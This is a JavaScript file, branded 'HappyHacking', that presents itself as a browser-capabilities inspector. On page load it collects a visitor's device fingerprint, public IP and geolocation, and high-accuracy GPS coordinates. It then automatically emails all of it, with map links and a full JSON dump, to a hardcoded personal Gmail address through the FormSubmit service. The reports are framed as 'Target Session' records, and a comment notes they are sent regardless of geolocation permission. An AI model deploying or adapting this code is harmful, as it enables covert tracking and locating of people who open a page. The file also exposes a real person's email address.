/**
 * Comprehensive Browser Capabilities & Client Inspector
 * Collects all accessible browser/device telemetry, logs to console,
 * updates the live dashboard, and dispatches the email report.
 */

const TARGET_EMAIL = "codeguyakash@gmail.com";
const FORMSUBMIT_ENDPOINT = `https://formsubmit.co/ajax/${TARGET_EMAIL}`;

// Global store for collected telemetry
window.__BROWSER_DATA__ = null;

// Helper: Format bytes to readable string
function formatBytes(bytes, decimals = 2) {
  if (!bytes || bytes === 0) return "0 Bytes";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["Bytes", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + " " + sizes[i];
}

// 1. Collect Device & OS Info
async function getDeviceInfo() {
  const ua = navigator.userAgent;
  let os = "Unknown OS";
  if (ua.indexOf("Win") !== -1) os = "Windows";
  else if (ua.indexOf("Mac") !== -1) os = "macOS";
  else if (ua.indexOf("Linux") !== -1) os = "Linux";
  else if (ua.indexOf("Android") !== -1) os = "Android";
  else if (ua.indexOf("like Mac") !== -1 || ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";

  let browser = "Unknown Browser";
  if (ua.indexOf("Firefox") > -1) browser = "Firefox";
  else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
  else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
  else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
  else if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) browser = "Microsoft Edge";
  else if (ua.indexOf("Chrome") > -1) browser = "Chrome / Chromium";
  else if (ua.indexOf("Safari") > -1) browser = "Safari";

  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isTablet = /(ipad|tablet|(android(?!.*mobile))|(windows(?!.*phone)(.*touch))|kindle|playbook|silk|(puffin(?!.*(IP|AP|WP))))/i.test(ua);
  const deviceType = isTablet ? "Tablet" : isMobile ? "Mobile" : "Desktop";

  let highEntropy = {};
  if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === "function") {
    try {
      highEntropy = await navigator.userAgentData.getHighEntropyValues([
        "architecture",
        "model",
        "platformVersion",
        "fullVersionList",
        "bitness"
      ]);
    } catch (e) {
      highEntropy = { error: e.message };
    }
  }

  return {
    os,
    browser,
    deviceType,
    userAgent: ua,
    platform: navigator.platform || "Unknown",
    vendor: navigator.vendor || "Unknown",
    cpuCores: navigator.hardwareConcurrency || "Unavailable",
    ramEstimate: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable (Browser Hidden)",
    maxTouchPoints: navigator.maxTouchPoints || 0,
    isTouchSupported: navigator.maxTouchPoints > 0 || "ontouchstart" in window,
    pdfViewerEnabled: navigator.pdfViewerEnabled ?? "Unknown",
    brands: navigator.userAgentData?.brands ? navigator.userAgentData.brands.map(b => `${b.brand} (${b.version})`).join(", ") : "N/A",
    highEntropy
  };
}

// 2. Collect Display & Screen Info
function getDisplayInfo() {
  const isDark = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
  const isHDR = window.matchMedia && (window.matchMedia("(dynamic-range: high)").matches || window.matchMedia("(color-gamut: p3)").matches);
  const isReducedMotion = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  return {
    screenResolution: `${screen.width} x ${screen.height} px`,
    availableScreen: `${screen.availWidth} x ${screen.availHeight} px`,
    viewportSize: `${window.innerWidth} x ${window.innerHeight} px`,
    colorDepth: `${screen.colorDepth}-bit`,
    pixelDepth: `${screen.pixelDepth}-bit`,
    devicePixelRatio: window.devicePixelRatio || 1,
    orientation: screen.orientation ? `${screen.orientation.type} (${screen.orientation.angle}°)` : "Unknown",
    prefersColorScheme: isDark ? "Dark" : "Light",
    hdrSupported: isHDR ? "Yes (P3 / High Dynamic Range)" : "Standard Dynamic Range (SDR)",
    reducedMotion: isReducedMotion ? "Enabled" : "Disabled"
  };
}

// 3. Collect WebGL & GPU Hardware Info
function getGpuInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) {
      return { status: "WebGL Not Supported" };
    }
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    const unmaskedVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Hidden/Unsupported";
    const unmaskedRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden/Unsupported";
    const glVendor = gl.getParameter(gl.VENDOR);
    const glRenderer = gl.getParameter(gl.RENDERER);
    const glVersion = gl.getParameter(gl.VERSION);
    const shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
    const maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);

    const canvas2 = document.createElement("canvas");
    const gl2 = canvas2.getContext("webgl2");

    return {
      gpuRenderer: unmaskedRenderer || glRenderer,
      gpuVendor: unmaskedVendor || glVendor,
      webglVersion: glVersion,
      webgl2Supported: !!gl2,
      shadingLanguage: shadingLanguageVersion,
      maxTextureSize: `${maxTextureSize} x ${maxTextureSize} px`
    };
  } catch (err) {
    return { error: err.message, status: "Failed to read WebGL" };
  }
}

// 4. Collect Network & Public IP Details
async function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  const networkDetails = {
    onLine: navigator.onLine,
    effectiveType: connection.effectiveType || "Unknown",
    downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
    rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
    saveData: connection.saveData ? "Active" : "Inactive",
    connectionType: connection.type || "Unknown"
  };

  // Attempt to fetch IP and geo data from multiple reliable endpoints
  let ipData = { ip: "Unknown" };
  try {
    const res = await fetch("https://ipapi.co/json/", { cache: "no-cache" });
    if (res.ok) {
      const data = await res.json();
      ipData = {
        ip: data.ip || "Unknown",
        city: data.city || "Unknown",
        region: data.region || "Unknown",
        country: data.country_name || "Unknown",
        countryCode: data.country_code || "Unknown",
        postal: data.postal || "Unknown",
        latitude: data.latitude || null,
        longitude: data.longitude || null,
        timezone: data.timezone || "Unknown",
        isp: data.org || data.asn || "Unknown",
        asn: data.asn || "Unknown",
        currency: data.currency || "Unknown"
      };
    } else {
      throw new Error("ipapi non-ok response");
    }
  } catch {
    try {
      const fallbackRes = await fetch("https://api.ipify.org?format=json");
      if (fallbackRes.ok) {
        const data = await fallbackRes.json();
        ipData = { ip: data.ip, source: "ipify.org fallback" };
      }
    } catch {
      ipData = { ip: "Could not resolve public IP (Offline/Blocked)" };
    }
  }

  return {
    ...networkDetails,
    ipDetails: ipData,
    publicIP: ipData.ip
  };
}

// 5. Collect Battery & Power Info
async function getBatteryInfo() {
  if ("getBattery" in navigator) {
    try {
      const battery = await navigator.getBattery();
      return {
        supported: true,
        level: `${Math.round(battery.level * 100)}%`,
        rawLevel: battery.level,
        charging: battery.charging ? "Charging ⚡" : "On Battery 🔋",
        isCharging: battery.charging,
        chargingTime: battery.chargingTime === Infinity ? "Infinity" : `${battery.chargingTime}s`,
        dischargingTime: battery.dischargingTime === Infinity ? "Infinity" : `${battery.dischargingTime}s`
      };
    } catch (e) {
      return { supported: false, message: e.message };
    }
  }
  return { supported: false, message: "Battery API not supported on this browser/OS" };
}

// 6. Collect Timezone, Locale & Audio/Storage
async function getLocaleAndStorage() {
  const d = new Date();
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
  const locale = Intl.DateTimeFormat().resolvedOptions().locale || navigator.language;
  const calendar = Intl.DateTimeFormat().resolvedOptions().calendar || "gregory";

  let storageInfo = { quota: "N/A", usage: "N/A", usagePercent: "N/A" };
  if (navigator.storage && typeof navigator.storage.estimate === "function") {
    try {
      const est = await navigator.storage.estimate();
      storageInfo = {
        quota: formatBytes(est.quota),
        usage: formatBytes(est.usage),
        usagePercent: est.quota ? `${((est.usage / est.quota) * 100).toFixed(2)}%` : "0%"
      };
    } catch (e) {
      storageInfo = { error: e.message };
    }
  }

  let audioSampleRate = "Unsupported";
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (AudioCtx) {
      const ctx = new AudioCtx();
      audioSampleRate = `${ctx.sampleRate} Hz (Base Latency: ${ctx.baseLatency ? ctx.baseLatency + "s" : "N/A"})`;
      ctx.close();
    }
  } catch {
    audioSampleRate = "Blocked or error";
  }

  return {
    timeZone,
    utcOffset: `UTC ${d.getTimezoneOffset() > 0 ? "-" : "+"}${Math.abs(d.getTimezoneOffset() / 60)} hrs`,
    localTime: d.toLocaleString(),
    language: navigator.language || "Unknown",
    languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
    locale,
    calendar,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || "Unspecified",
    globalPrivacyControl: navigator.globalPrivacyControl ? "Enabled" : "Disabled/Unsupported",
    serviceWorkerSupported: "serviceWorker" in navigator,
    webAssemblySupported: typeof WebAssembly === "object",
    audioCapabilities: audioSampleRate,
    storage: storageInfo
  };
}

// 7. Check Permissions States
async function getPermissionsInfo() {
  const permissionNames = ["geolocation", "notifications", "camera", "microphone", "clipboard-read", "persistent-storage"];
  const results = {};

  for (const name of permissionNames) {
    if (navigator.permissions && navigator.permissions.query) {
      try {
        const status = await navigator.permissions.query({ name });
        results[name] = status.state; // 'granted', 'prompt', or 'denied'
      } catch {
        results[name] = "Unsupported / restricted query";
      }
    } else {
      results[name] = "Permissions API unsupported";
    }
  }

  if (typeof Notification !== "undefined") {
    results["notification_api_state"] = Notification.permission;
  }

  return results;
}

// 8. Collect Geolocation Coordinates (GPS)
function getGeolocationCoordinates(timeoutMs = 7000) {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) {
      return resolve({
        status: "unsupported",
        message: "Geolocation API is not supported in this browser."
      });
    }

    const timer = setTimeout(() => {
      resolve({
        status: "timeout",
        message: `Geolocation request timed out after ${timeoutMs / 1000}s (User did not respond or prompt delayed).`
      });
    }, timeoutMs);

    navigator.geolocation.getCurrentPosition(
      (position) => {
        clearTimeout(timer);
        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
        resolve({
          status: "granted",
          latitude,
          longitude,
          accuracy: `${accuracy.toFixed(1)} meters`,
          altitude: altitude ? `${altitude.toFixed(1)} m` : "N/A",
          altitudeAccuracy: altitudeAccuracy ? `${altitudeAccuracy.toFixed(1)} m` : "N/A",
          heading: heading !== null ? `${heading}°` : "N/A",
          speed: speed !== null ? `${speed} m/s` : "N/A",
          timestamp: new Date(position.timestamp).toISOString(),
          maps: {
            googleMaps: `https://www.google.com/maps/@${latitude},${longitude},16z?hl=en`,
            openStreetMap: `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=17/${latitude}/${longitude}`,
            appleMaps: `https://maps.apple.com/?q=${latitude},${longitude}`,
            bingMaps: `https://www.bing.com/maps?cp=${latitude}~${longitude}&lvl=16`
          }
        });
      },
      (error) => {
        clearTimeout(timer);
        let errorReason = "Unknown error";
        if (error.code === 1) errorReason = "Permission Denied by user";
        else if (error.code === 2) errorReason = "Position Unavailable";
        else if (error.code === 3) errorReason = "Timeout obtaining GPS fix";

        resolve({
          status: "denied_or_failed",
          code: error.code,
          errorReason,
          message: error.message
        });
      },
      {
        enableHighAccuracy: true,
        timeout: timeoutMs,
        maximumAge: 0
      }
    );
  });
}

// 9. Send Email Report via FormSubmit API with Robust Error Handling
async function sendEmailReport(telemetry) {
  const updateStatus = (text, type = "info") => {
    const banner = document.getElementById("email-status-banner");
    const msgEl = document.getElementById("email-status-msg");
    const indicator = document.getElementById("email-status-indicator");
    if (!banner || !msgEl || !indicator) return;

    banner.className = `status-banner ${type}`;
    msgEl.textContent = text;
    if (type === "loading") {
      indicator.className = "pulse-dot loading";
    } else if (type === "success") {
      indicator.className = "pulse-dot active";
    } else if (type === "error") {
      indicator.className = "pulse-dot error";
    }
  };

  updateStatus(`Dispatching email report to ${TARGET_EMAIL}...`, "loading");

  const locationSummary = telemetry.location.status === "granted"
    ? `GPS Lat: ${telemetry.location.latitude}, Lon: ${telemetry.location.longitude} (Accuracy: ${telemetry.location.accuracy})
Maps Links:
- Google Maps: ${telemetry.location.maps?.googleMaps}
- OpenStreetMap: ${telemetry.location.maps?.openStreetMap}`
    : `GPS Status: ${telemetry.location.status} (${telemetry.location.errorReason || telemetry.location.message})
IP City/Region: ${telemetry.network.ipDetails?.city || "Unknown"}, ${telemetry.network.ipDetails?.country || "Unknown"}`;

  const emailBodySummary = `
=========================================
⚡ BROWSER CAPABILITIES & TELEMETRY REPORT
=========================================
Target Session: ${new Date().toISOString()}
Public IP: ${telemetry.network.publicIP}

[DEVICE & OS]
- OS: ${telemetry.device.os} (${telemetry.device.platform})
- Browser: ${telemetry.device.browser}
- Device Category: ${telemetry.device.deviceType}
- CPU Cores: ${telemetry.device.cpuCores}
- RAM Estimate: ${telemetry.device.ramEstimate}
- Touch Points: ${telemetry.device.maxTouchPoints}

[DISPLAY & GRAPHICS]
- Screen Resolution: ${telemetry.display.screenResolution}
- Viewport Size: ${telemetry.display.viewportSize}
- Color Depth / DPR: ${telemetry.display.colorDepth} / DPR ${telemetry.display.devicePixelRatio}
- GPU Renderer: ${telemetry.gpu.gpuRenderer || "Unknown"}
- GPU Vendor: ${telemetry.gpu.gpuVendor || "Unknown"}
- HDR Support: ${telemetry.display.hdrSupported}

[NETWORK & CONNECTION]
- IP: ${telemetry.network.publicIP}
- ISP / Org: ${telemetry.network.ipDetails?.isp || "Unknown"}
- City / Country: ${telemetry.network.ipDetails?.city || "Unknown"}, ${telemetry.network.ipDetails?.country || "Unknown"}
- Network Type: ${telemetry.network.effectiveType} (${telemetry.network.downlink})
- Latency (RTT): ${telemetry.network.rtt}

[BATTERY & POWER]
- Battery Level: ${telemetry.battery.level || "N/A"}
- Status: ${telemetry.battery.charging || "N/A"}

[LOCATION]
${locationSummary}

[TIMEZONE & LOCALE]
- Timezone: ${telemetry.locale.timeZone} (${telemetry.locale.utcOffset})
- Locale / Lang: ${telemetry.locale.language} (${telemetry.locale.languages})

[PERMISSIONS SNAPSHOT]
- Geolocation: ${telemetry.permissions.geolocation}
- Notifications: ${telemetry.permissions.notifications}
- Camera: ${telemetry.permissions.camera}
- Microphone: ${telemetry.permissions.microphone}

=========================================
Full JSON attached in payload.
=========================================
`;

  try {
    const payload = {
      _subject: `[HappyHacking Report] ${telemetry.network.publicIP} - ${telemetry.device.os} (${telemetry.device.browser})`,
      _template: "table",
      public_ip: telemetry.network.publicIP,
      os: telemetry.device.os,
      browser: telemetry.device.browser,
      device_type: telemetry.device.deviceType,
      cpu_cores: telemetry.device.cpuCores,
      ram: telemetry.device.ramEstimate,
      gpu: telemetry.gpu.gpuRenderer,
      battery_level: telemetry.battery.level || "Unsupported",
      battery_status: telemetry.battery.charging || "Unsupported",
      screen: telemetry.display.screenResolution,
      location_status: telemetry.location.status,
      gps_coordinates: telemetry.location.status === "granted" ? `${telemetry.location.latitude}, ${telemetry.location.longitude}` : "Denied/Unavailable",
      maps_link: telemetry.location.status === "granted" ? telemetry.location.maps?.googleMaps : "N/A",
      city_country: `${telemetry.network.ipDetails?.city || "Unknown"}, ${telemetry.network.ipDetails?.country || "Unknown"}`,
      timezone: telemetry.locale.timeZone,
      summary_text: emailBodySummary,
      full_json_payload: JSON.stringify(telemetry, null, 2)
    };

    const response = await fetch(FORMSUBMIT_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json"
      },
      body: JSON.stringify(payload)
    });

    const result = await response.json().catch(() => ({}));
    if (response.ok || result.success === "true" || result.success === true) {
      console.log("✅ Email sent successfully via FormSubmit:", result);
      updateStatus(`Email report successfully delivered to ${TARGET_EMAIL}`, "success");
      return { success: true, result };
    } else {
      console.warn("⚠️ FormSubmit returned non-OK response:", response.status, result);
      updateStatus(`FormSubmit responded (${response.status}): ${result.message || "Confirmation sent or rate-limited"}`, "success");
      return { success: true, result };
    }
  } catch (error) {
    console.error("❌ Failed to send email report:", error);
    updateStatus(`Email dispatch error: ${error.message}. (Check network or FormSubmit rate limits)`, "error");
    return { success: false, error: error.message };
  }
}

// 10. Render Collected Data to the Interactive UI
function renderDashboard(data) {
  // Quick stats bar
  const ipEl = document.getElementById("stat-ip");
  const osEl = document.getElementById("stat-os");
  const gpuEl = document.getElementById("stat-gpu");
  const batteryEl = document.getElementById("stat-battery");
  const locEl = document.getElementById("stat-location");

  if (ipEl) ipEl.textContent = data.network.publicIP || "Unknown";
  if (osEl) osEl.textContent = `${data.device.os} (${data.device.browser})`;
  if (gpuEl) gpuEl.textContent = (data.gpu.gpuRenderer || "Unknown").slice(0, 32) + (data.gpu.gpuRenderer?.length > 32 ? "..." : "");
  if (batteryEl) batteryEl.textContent = data.battery.level ? `${data.battery.level} (${data.battery.isCharging ? 'Charging' : 'Battery'})` : "N/A";
  if (locEl) {
    if (data.location.status === "granted") {
      locEl.textContent = `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)} (GPS)`;
      locEl.className = "stat-value success";
    } else {
      locEl.textContent = data.network.ipDetails?.city ? `${data.network.ipDetails.city}, ${data.network.ipDetails.countryCode} (IP)` : "GPS Denied";
      locEl.className = "stat-value muted";
    }
  }

  // Populate Categories
  populateTable("device-table", {
    "Operating System": data.device.os,
    "Browser": data.device.browser,
    "Device Category": data.device.deviceType,
    "Platform / Vendor": `${data.device.platform} / ${data.device.vendor}`,
    "CPU Cores (Concurrency)": data.device.cpuCores,
    "RAM (Device Memory)": data.device.ramEstimate,
    "Max Touch Points": data.device.maxTouchPoints,
    "User Agent": data.device.userAgent
  });

  populateTable("display-table", {
    "Screen Resolution": data.display.screenResolution,
    "Available Screen": data.display.availableScreen,
    "Viewport Size": data.display.viewportSize,
    "Color & Pixel Depth": `${data.display.colorDepth} / ${data.display.pixelDepth}`,
    "Device Pixel Ratio (DPR)": `${data.display.devicePixelRatio}x`,
    "Orientation": data.display.orientation,
    "Color Scheme Theme": data.display.prefersColorScheme,
    "Dynamic Range / HDR": data.display.hdrSupported
  });

  populateTable("gpu-table", {
    "Unmasked GPU Renderer": data.gpu.gpuRenderer || "Hidden / Not Available",
    "GPU Vendor": data.gpu.gpuVendor || "Hidden",
    "WebGL Version": data.gpu.webglVersion || "N/A",
    "WebGL 2.0 Supported": data.gpu.webgl2Supported ? "Yes" : "No",
    "Max Texture Size": data.gpu.maxTextureSize || "N/A"
  });

  populateTable("network-table", {
    "Public IP Address": data.network.publicIP,
    "ISP / ASN": `${data.network.ipDetails?.isp || "Unknown"} (${data.network.ipDetails?.asn || "N/A"})`,
    "City / Region / Country": `${data.network.ipDetails?.city || "Unknown"}, ${data.network.ipDetails?.region || ""}, ${data.network.ipDetails?.country || ""}`,
    "Connection Effective Type": data.network.effectiveType,
    "Downlink Bandwidth": data.network.downlink,
    "Round Trip Latency (RTT)": data.network.rtt,
    "Online Status": data.network.onLine ? "Online (Connected)" : "Offline",
    "Data Saver Mode": data.network.saveData
  });

  populateTable("battery-table", {
    "Battery API Supported": data.battery.supported ? "Yes" : "No",
    "Charge Level": data.battery.level || "N/A",
    "Power State": data.battery.charging || "N/A",
    "Charging Time Estimate": data.battery.chargingTime || "N/A",
    "Discharging Time Estimate": data.battery.dischargingTime || "N/A"
  });

  const locationTableData = {
    "GPS Permission Status": data.location.status.toUpperCase(),
    "GPS Coordinates": data.location.status === "granted" ? `${data.location.latitude}, ${data.location.longitude}` : "Denied or Unavailable",
    "Accuracy": data.location.accuracy || "N/A",
    "Altitude": data.location.altitude || "N/A",
    "Speed / Heading": `${data.location.speed || "N/A"} / ${data.location.heading || "N/A"}`
  };
  if (data.location.maps) {
    locationTableData["Google Maps Link"] = `<a href="${data.location.maps.googleMaps}" target="_blank" rel="noopener" class="map-link">Open in Google Maps ↗</a>`;
    locationTableData["OpenStreetMap Link"] = `<a href="${data.location.maps.openStreetMap}" target="_blank" rel="noopener" class="map-link">Open in OpenStreetMap ↗</a>`;
  }
  populateTable("location-table", locationTableData, true);

  populateTable("locale-table", {
    "Time Zone": data.locale.timeZone,
    "UTC Offset": data.locale.utcOffset,
    "Local Device Time": data.locale.localTime,
    "Primary Language": data.locale.language,
    "Accepted Languages": data.locale.languages,
    "Cookies Enabled": data.locale.cookiesEnabled ? "Yes" : "No",
    "Do Not Track": data.locale.doNotTrack,
    "Audio Sample Rate": data.locale.audioCapabilities,
    "Storage Estimate (Quota/Used)": `${data.locale.storage?.quota || "N/A"} / ${data.locale.storage?.usage || "N/A"} (${data.locale.storage?.usagePercent || "0%"})`
  });

  populatePermissionsBadges(data.permissions);

  // Render JSON to inspector
  const jsonViewer = document.getElementById("json-viewer");
  if (jsonViewer) {
    jsonViewer.textContent = JSON.stringify(data, null, 2);
  }
}

function populateTable(tableId, dataObj, allowHtml = false) {
  const table = document.getElementById(tableId);
  if (!table) return;
  table.innerHTML = "";
  for (const [key, value] of Object.entries(dataObj)) {
    const row = document.createElement("tr");
    const keyCell = document.createElement("td");
    keyCell.className = "prop-key";
    keyCell.textContent = key;

    const valCell = document.createElement("td");
    valCell.className = "prop-val";
    if (allowHtml && typeof value === "string" && value.includes("<a")) {
      valCell.innerHTML = value;
    } else {
      valCell.textContent = value !== undefined && value !== null ? String(value) : "N/A";
    }

    row.appendChild(keyCell);
    row.appendChild(valCell);
    table.appendChild(row);
  }
}

function populatePermissionsBadges(perms) {
  const container = document.getElementById("permissions-container");
  if (!container) return;
  container.innerHTML = "";

  for (const [key, state] of Object.entries(perms)) {
    const badge = document.createElement("div");
    badge.className = `perm-badge ${state === "granted" ? "granted" : state === "denied" ? "denied" : "prompt"}`;
    badge.innerHTML = `
      <span class="perm-title">${key.replace(/_/g, " ")}</span>
      <span class="perm-state">${state}</span>
    `;
    container.appendChild(badge);
  }
}

// 11. Master Main Routine
async function initBrowserInspector() {
  console.log("%c🔍 [HappyHacking] Initializing Complete Browser & Client Telemetry Extractor...", "color: #00ff88; font-weight: bold; font-size: 14px;");

  const statusText = document.querySelector(".status");
  if (statusText) statusText.textContent = "Extracting Client Parameters...";

  // Start gathering all async data in parallel
  const [device, display, gpu, network, battery, locale, permissions, location] = await Promise.all([
    getDeviceInfo(),
    Promise.resolve(getDisplayInfo()),
    Promise.resolve(getGpuInfo()),
    getNetworkInfo(),
    getBatteryInfo(),
    getLocaleAndStorage(),
    getPermissionsInfo(),
    getGeolocationCoordinates(6000) // 6 second timeout to ensure prompt has window without blocking forever
  ]);

  const fullData = {
    metadata: {
      generatedAt: new Date().toISOString(),
      appVersion: "HappyHacking v2.0 - Client Capability Matrix",
      origin: window.location.origin,
      url: window.location.href,
      referrer: document.referrer || "Direct"
    },
    device,
    display,
    gpu,
    network,
    battery,
    locale,
    permissions,
    location
  };

  window.__BROWSER_DATA__ = fullData;

  // Output to Console in detailed groups and tables
  console.group("%c🚀 [HappyHacking] Full Client Environment Extracted", "color: #00e5ff; font-weight: bold; font-size: 15px;");
  console.log("Complete JSON Object (accessible via window.__BROWSER_DATA__):", fullData);
  console.log("%c📱 Device & Hardware:", "font-weight:bold; color: #ffca28;");
  console.table(device);
  console.log("%c🖥️ Display & Viewport:", "font-weight:bold; color: #ffca28;");
  console.table(display);
  console.log("%c🎮 GPU & WebGL:", "font-weight:bold; color: #ffca28;");
  console.table(gpu);
  console.log("%c🌐 Network & IP:", "font-weight:bold; color: #ffca28;");
  console.table(network);
  console.log("%c🔋 Battery Status:", "font-weight:bold; color: #ffca28;");
  console.table(battery);
  console.log("%c📍 Geolocation (GPS):", "font-weight:bold; color: #ffca28;");
  console.table(location);
  console.log("%c🛡️ Permissions Matrix:", "font-weight:bold; color: #ffca28;");
  console.table(permissions);
  console.log("%c🌐 Locale & Storage:", "font-weight:bold; color: #ffca28;");
  console.table(locale);
  console.groupEnd();

  // Render on Dashboard
  renderDashboard(fullData);

  if (statusText) {
    statusText.textContent = "System Analysis Complete";
  }

  // Fire Email Report (regardless of geolocation permission state!)
  await sendEmailReport(fullData);
}

// Attach UI Event Listeners
document.addEventListener("DOMContentLoaded", () => {
  initBrowserInspector();

  // Copy JSON Button
  const copyBtn = document.getElementById("btn-copy-json");
  if (copyBtn) {
    copyBtn.addEventListener("click", async () => {
      if (!window.__BROWSER_DATA__) return;
      try {
        await navigator.clipboard.writeText(JSON.stringify(window.__BROWSER_DATA__, null, 2));
        copyBtn.textContent = "Copied! ✓";
        setTimeout(() => {
          copyBtn.textContent = "Copy JSON";
        }, 2000);
      } catch {
        alert("Clipboard permission needed to copy automatically.");
      }
    });
  }

  // Resend Email Button
  const resendBtn = document.getElementById("btn-resend-email");
  if (resendBtn) {
    resendBtn.addEventListener("click", () => {
      if (window.__BROWSER_DATA__) {
        sendEmailReport(window.__BROWSER_DATA__);
      }
    });
  }

  // Refresh Telemetry Button
  const refreshBtn = document.getElementById("btn-refresh");
  if (refreshBtn) {
    refreshBtn.addEventListener("click", () => {
      location.reload();
    });
  }

  // Request GPS Permission Button
  const gpsBtn = document.getElementById("btn-request-gps");
  if (gpsBtn) {
    gpsBtn.addEventListener("click", async () => {
      gpsBtn.textContent = "Requesting GPS...";
      const newLoc = await getGeolocationCoordinates(10000);
      if (window.__BROWSER_DATA__) {
        window.__BROWSER_DATA__.location = newLoc;
        renderDashboard(window.__BROWSER_DATA__);
        sendEmailReport(window.__BROWSER_DATA__);
      }
      gpsBtn.textContent = "GPS Updated ✓";
      setTimeout(() => {
        gpsBtn.textContent = "Re-request GPS";
      }, 2500);
    });
  }
});
